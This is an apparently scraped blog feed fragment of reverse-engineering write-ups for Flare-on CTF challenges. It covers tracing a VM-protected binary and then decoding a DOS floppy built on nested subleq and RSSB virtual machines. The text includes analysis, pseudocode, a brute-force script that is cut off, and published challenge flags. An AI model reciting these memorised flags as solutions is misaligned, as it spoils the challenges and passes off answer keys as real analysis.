&lt;h3 id=&quot;1-set_funcs_in_array&quot;&gt;1) set_funcs_in_array:&lt;/h3&gt;

&lt;p&gt;Populates an array with 24 different function addresses.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on6/chall11/funcs_array.png&quot; alt=&quot;funcs_array&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-run_vm&quot;&gt;2) run_vm:&lt;/h3&gt;

&lt;p&gt;Runs the vm engine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on6/chall11/vm_engine.png&quot; alt=&quot;vm_engine&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3-check_result_vm&quot;&gt;3) check_result_vm:&lt;/h3&gt;

&lt;p&gt;1- Compares 2 strings generated by the vm.
2- Checks if the first argument is equal to &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FLARE2019&lt;/code&gt;&lt;/strong&gt;
3- Xor a string generated by the vm with a hardcoded string.&lt;/p&gt;

&lt;h2 id=&quot;tracing-the-vm&quot;&gt;Tracing the vm&lt;/h2&gt;

&lt;p&gt;The simplest approach to understand how a virtual machine protection works is to understand the functionality of each custom opcode of the vm, then dynamically tracing it’s arguments and it’s output (if required).&lt;/p&gt;

&lt;p&gt;To do so I added breakpoints before and after the execution of each custom opcode to retrieve the arguments and the result using IDAPython.&lt;/p&gt;

&lt;p&gt;for example:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on6/chall11/example_bps.png&quot; alt=&quot;example_bps&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the resulting log file was something as follow:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on6/chall11/script_output.png&quot; alt=&quot;script_output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after a deep analysis and a backward tracing (form the result to the original data) the hash generated from the second argument, I came up with the following algorithm&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on6/chall11/input_alteration.png&quot; alt=&quot;input_alteration&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Note: It is not needed to understand the algorithm that uses the first argument, as it has to be &quot;FLARE2019&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Knowing the resulting hash from “FLARE2019” after executing the vm is: &lt;strong&gt;7070b2ac01d25e610aa72aa8081c861ae845c829b2f3a11e0000000000000000&lt;/strong&gt;, and that both hashes generated hashes must be equal, we can just reverse the second algorithm and give it the known hash to retrieve the right input for the second argument.&lt;/p&gt;

&lt;p&gt;script here&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on6/chall11/flags_output.png&quot; alt=&quot;flags_output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With some fails and tries I was able to retrieve the flag which is: &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVX5_VM_M4K3S_BASE64_C0MPL1C4T3D@flare-on.com&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;</content><author><name></name></author><category term="reverse" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Flare-on challenge 12</title><link href="http://localhost:4000/2018/10/04/flare-on5-chall12.html" rel="alternate" type="text/html" title="Flare-on challenge 12" /><published>2018-10-04T17:05:00-05:00</published><updated>2018-10-04T17:05:00-05:00</updated><id>http://localhost:4000/2018/10/04/flare-on5-chall12</id><content type="html" xml:base="http://localhost:4000/2018/10/04/flare-on5-chall12.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Now for the final test of your focus and dedication. 
We found a floppy disk that was given to spies to transmit secret messages.
he spies were also given the password, we don't have that information,
but see if you can figure out the message anyway. 
You are saving lives.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: I’m sorry the writeup is a bit messy, I couldn’t find the time to write it properly, if you have any question please contact me, have fun :D
I will update it whenever I find some free time.&lt;/p&gt;

&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;

&lt;p&gt;We are provided with a 16bit DOS bootable system, it prints some messages then asks for a password, deeper withing the system, &lt;strong&gt;2 virtual machines&lt;/strong&gt; are implemented, the first is implemented with &lt;a href=&quot;https://en.wikipedia.org/wiki/One_instruction_set_computer#Subtract_and_branch_if_less_than_or_equal_to_zero&quot;&gt;subleqs&lt;/a&gt; which role is to emulate the second VM, and the other one is implemented with &lt;a href=&quot;https://en.wikipedia.org/wiki/One_instruction_set_computer#Reverse_subtract_and_skip_if_borrow&quot;&gt;RSSB&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;setting-up-the-environnement&quot;&gt;Setting up the environnement&lt;/h2&gt;

&lt;p&gt;I used &lt;a href=&quot;http://bochs.sourceforge.net&quot;&gt;BOCHS&lt;/a&gt; with &lt;strong&gt;IDA&lt;/strong&gt; to run and debug the DOS system, to do that, you have to open &lt;strong&gt;IDA&lt;/strong&gt; and choose &lt;strong&gt;BOCHS&lt;/strong&gt; as debugger, then open this configuration file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;megs: 16

# hard disk
# ata0: enabled=1, ioaddr1=0x1f0, ioaddr2=0x3f0, irq=14

# floppy
floppya: type=1_44, 1_44=&quot;suspicious_floppy_v1.0.img&quot;, status=inserted

# what disk images will be used:

clock: sync=none

boot: floppy
panic: action=fatal
error: action=report
info: action=report
debug: action=ignore
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;reversing-the-dos-system-part&quot;&gt;Reversing the DOS system part&lt;/h2&gt;

&lt;p&gt;The files of the system:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/system_files.png&quot; alt=&quot;system_files&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I first noticed some helpful stuff, as you can see in this screenshot, &lt;strong&gt;key.data&lt;/strong&gt; contains the previous input&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/key_data.png&quot; alt=&quot;key_data&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also when reading &lt;strong&gt;message.data&lt;/strong&gt; the same program that checks the password gets executed, this can hint that a certain &lt;strong&gt;syscall&lt;/strong&gt; is &lt;strong&gt;hooked&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/message_data.png&quot; alt=&quot;message_data&quot; /&gt;&lt;/p&gt;

&lt;p&gt;cool, now to the real stuff, let’s use our debugger !&lt;/p&gt;

&lt;p&gt;First we need to put a breakpoint in &lt;strong&gt;0x7c00&lt;/strong&gt;, and start exploring the assembly code, briefly those are the most important part to know&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Reads input from STDIN&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/read_input.png&quot; alt=&quot;read_input&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Open key.data and write input to it&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/write_to_key.png&quot; alt=&quot;write_to_key&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Open message.data and read from it, this is where the &lt;strong&gt;syscall&lt;/strong&gt; is &lt;strong&gt;triggered&lt;/strong&gt;, following the assembly code I ended up to a &lt;strong&gt;INT 13h&lt;/strong&gt;, executing this interruption will read &lt;strong&gt;TMP.data&lt;/strong&gt; and start executing its code.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/read_tmp_and_execute.png&quot; alt=&quot;read_tmp_and_execute&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After some assembly instructions, I noticed that it copies input to a certain memory with unicode format&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/copy_input.png&quot; alt=&quot;copy_input&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then the code enter to a loop which is the main engine of the subleq virtual machine located at &lt;strong&gt;0x9d9d9&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/main_loop.png&quot; alt=&quot;main_loop&quot; /&gt;&lt;/p&gt;

&lt;p&gt;overview of the engine:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/graph_main_loop.png&quot; alt=&quot;graph_main_loop&quot; /&gt;&lt;/p&gt;

&lt;p&gt;in each iteration of the engine a certain function located at &lt;strong&gt;0x9d99d&lt;/strong&gt; is called&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/exec_subleq_instr.png&quot; alt=&quot;exec_subleq_instr&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the assembly code we can deduce that this is &lt;strong&gt;subleq&lt;/strong&gt; VM.&lt;/p&gt;

&lt;p&gt;To get a better control of the execution flow, I ported the assembly code to &lt;strong&gt;C&lt;/strong&gt; code you can find the emulator in my github &lt;a href=&quot;https://github.com/soolidsnake/Write-ups/blob/master/Flare-on5/Suspicious_Floppy/subleq_emulator.c&quot;&gt;subleq emulator&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Running the C program generates 150 millions subleq instructions, for this type of situation we can trace the instruction pointer of the virtual machine and draw a graph out of it&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/graph_subleq_big.png&quot; alt=&quot;graph_subleq_big&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the graph and with some past experience, we can suppose that subleq is actually emulating another virtual machine, let’s see the graph in more detail&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/graph_subleq.png&quot; alt=&quot;graph_subleq&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see the graph is constant, it always jump to the same addresses, our next goal is to figure our 2 things&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The base address of the second virtual machine&lt;/li&gt;
  &lt;li&gt;The type of the second virtual machine&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Before that, I had the idea of writing some higher level instructions out of the subleq instructions &lt;a href=&quot;https://github.com/soolidsnake/Write-ups/blob/master/Flare-on5/Suspicious_Floppy/subleq_emulator_high_instr.c&quot;&gt;subleq emulator higher instructions&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;looking through the subleqs translated to a higher level language and with the help of the graph, we can notice an interesting part&lt;/p&gt;

&lt;p&gt;first iteration
&lt;img src=&quot;/assets/img/flare-on/chall12/high_subleq_0.png&quot; alt=&quot;high_subleq_0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;second iteration:
&lt;img src=&quot;/assets/img/flare-on/chall12/high_subleq_1.png&quot; alt=&quot;high_subleq_1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;third iteration:
&lt;img src=&quot;/assets/img/flare-on/chall12/high_subleq_2.png&quot; alt=&quot;high_subleq_2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can assume that the address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[010f]&lt;/code&gt; contains the base address of the second vm which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{07f6}&lt;/code&gt;, looking a bit deeper we can notice other stuff like:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A &lt;strong&gt;pointer&lt;/strong&gt; at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[07f6]&lt;/code&gt;, which is actually the offset pointer&lt;/li&gt;
  &lt;li&gt;A value &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{25b7}&lt;/code&gt; is compared to that &lt;strong&gt;pointer&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Data been copied from &lt;strong&gt;[base_address + offset_pointer]&lt;/strong&gt; to &lt;strong&gt;[0254]&lt;/strong&gt;
for example, the first iteration it copies data from &lt;strong&gt;0x951&lt;/strong&gt;
the second one copies from &lt;strong&gt;0x952&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Knowing that, we can focus on first the iterations to determine the type of the second VM.&lt;/p&gt;

&lt;p&gt;First I compared the differences between each iteration to help me understand the flow. After that I enumerated everything that is happening in a single iteration then concluded that the second VM is actually using &lt;strong&gt;RSSB&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;to explain this with more details, I will take the second iteration as an example:&lt;/p&gt;

&lt;p&gt;as you can see here, it does the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Calculates the vm pointer by summing &lt;strong&gt;base address&lt;/strong&gt; + &lt;strong&gt;offset pointer&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Mov the vm data(&lt;strong&gt;0160&lt;/strong&gt;) pointed by the vm pointer to &lt;strong&gt;0x0254&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/subleq_calculate_pointer_mov_data_rssb.png&quot; alt=&quot;subleq_calculate_pointer_mov_data_rssb&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Calculates another vm address(&lt;strong&gt;0956&lt;/strong&gt;) by adding &lt;strong&gt;base address(07f6)&lt;/strong&gt; + &lt;strong&gt;vm_data(0160)&lt;/strong&gt; found earlier&lt;/li&gt;
  &lt;li&gt;Mov data(&lt;strong&gt;0002&lt;/strong&gt;) pointed by &lt;strong&gt;0956&lt;/strong&gt; to &lt;strong&gt;07ee&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/calculate_pointer_to_op_get_op.png&quot; alt=&quot;calculate_pointer_to_op_get_op&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Subtract that data(&lt;strong&gt;0002&lt;/strong&gt;) from the content of &lt;strong&gt;07ee&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Mov the result to &lt;strong&gt;07ee&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/subleq_sub_rssb.png&quot; alt=&quot;subleq_sub_rssb&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is enough to suppose that the second vm is using &lt;strong&gt;RSSB&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Next, I dumped the data starting from the base address of the second vm &lt;strong&gt;(07f6)&lt;/strong&gt;, and wrote a RSSB emulator to check either my supposition was correct or not, fortunately it was !
Here is my &lt;strong&gt;C&lt;/strong&gt; code to emulate it &lt;a href=&quot;https://github.com/soolidsnake/Write-ups/blob/master/Flare-on5/Suspicious_Floppy/rssb_emulator.c&quot;&gt;rssb emulator&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Our next goal is to figure out how the input is checked, but first an overview about what is happening is crucial so I made another graph&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/rssb_graph.png&quot; alt=&quot;rssb_graph&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With this we can divided our research in 3 parts according to the graph, each part is a loop with multiple iterations&lt;/p&gt;

&lt;h2 id=&quot;part-0&quot;&gt;PART 0&lt;/h2&gt;

&lt;p&gt;By fuzzing with different input, I noticed something interesting, for example if you put &lt;strong&gt;@&lt;/strong&gt; at the beginning of your input the &lt;strong&gt;PART 0&lt;/strong&gt; executes less instructions compared if you put &lt;strong&gt;@&lt;/strong&gt; at the end of your input.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/@_start.png&quot; alt=&quot;@_start&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/@_pos_9.png&quot; alt=&quot;@_pos_9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Checking the RSSB instructions reveals that the supposition was correct to summarize it, it go through the input and check if &lt;strong&gt;@&lt;/strong&gt; is present, if it does, it jumps to &lt;strong&gt;PART1&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Here we can see that it subs my first character which was &lt;strong&gt;‘a’ (0x61 in hex)&lt;/strong&gt; from &lt;strong&gt;’@’ (0x40 in hex)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/rssb_check_@.png&quot; alt=&quot;rssb_check_@&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;part-1&quot;&gt;PART 1&lt;/h2&gt;

&lt;p&gt;This part is always present before &lt;strong&gt;PART 2&lt;/strong&gt;, after reading its instructions I was able to come up with this expression: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input[i]-0x20 + ((input[i+1]-0x20) &amp;lt;&amp;lt; 7)&lt;/code&gt;
in each iteration &lt;strong&gt;i&lt;/strong&gt; is incremented by 2, knowing that we have 15 of those iterations, we suppose that the password length is &lt;strong&gt;30&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/calc_first_sec_char.png&quot; alt=&quot;calc_first_sec_char&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;part-2&quot;&gt;PART 2&lt;/h2&gt;

&lt;p&gt;This part is constant even with different input, it get executed only when &lt;strong&gt;@&lt;/strong&gt; is present in the input, we can see &lt;strong&gt;15&lt;/strong&gt; iterations of the same loop, so I assumed this is the part that &lt;strong&gt;checks&lt;/strong&gt; the password&lt;/p&gt;

&lt;p&gt;Digging deeper by reading the instructions and by arming my self with a lot of &lt;strong&gt;patience&lt;/strong&gt;, I was able to understand the flow of the check, it performs sequentially the following operations:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Xor the value calculated earlier: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input[i]-0x20 + ((input[i+1]-0x20) &amp;lt;&amp;lt; 7)&lt;/code&gt; with &lt;strong&gt;iteration number of PART2&lt;/strong&gt; multiplied by &lt;strong&gt;33&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Calculate the &lt;strong&gt;sum of the input characters&lt;/strong&gt; then add to it a value &lt;strong&gt;dependent of number of chars before ‘@’&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/sum_chars_length_var.png&quot; alt=&quot;sum_chars_length_var&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Add the 2 values calculated&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/add_A_B.png&quot; alt=&quot;add_A_B&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Compare result with a hardcoded hash&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/check_with_hash.png&quot; alt=&quot;check_with_hash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A pseudo code for &lt;strong&gt;PART1&lt;/strong&gt; and &lt;strong&gt;PART2&lt;/strong&gt; would be:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;correct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;iteration&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iteration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum_chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variable_dependent_of_length&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hardcoded_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;correct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;correct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;iteration&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;correct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'success'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'error'&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After extracting the 15 hashes, the goal is to bruteforce the characters 2 by 2, the only problem is that we don’t have the sum of the password characters, so I supposed that the password ends with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@flare-on.com&lt;/code&gt; we can use for example &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;om&lt;/code&gt; to retrieve the sum, and then bruteforce the remaining characters:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;itertools&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;post_flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'@flare-on.com'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;flag_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;summ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;length_var&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8400&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hashes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xfc7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf30f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf361&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf151&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf886&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf3d1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdb57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xd9d5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe26e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf8cd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf969&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span 